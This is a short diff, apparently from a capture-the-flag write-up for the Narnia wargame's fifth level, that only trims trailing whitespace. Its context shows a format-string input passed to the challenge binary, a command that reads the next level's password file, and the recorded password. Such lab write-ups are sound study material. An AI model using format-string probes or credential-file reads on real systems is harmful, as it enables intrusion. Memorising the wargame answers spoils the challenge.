@@ -16,5 +16,5 @@ cd /narnia
 
 ./narnia5 $(python3 -c "import sys; sys.stdout.buffer.write(b'%u_%u_%u')")
 
-cat /etc/narnia_pass/narnia6   
+cat /etc/narnia_pass/narnia6
 # Password: BNSjoSDeGL
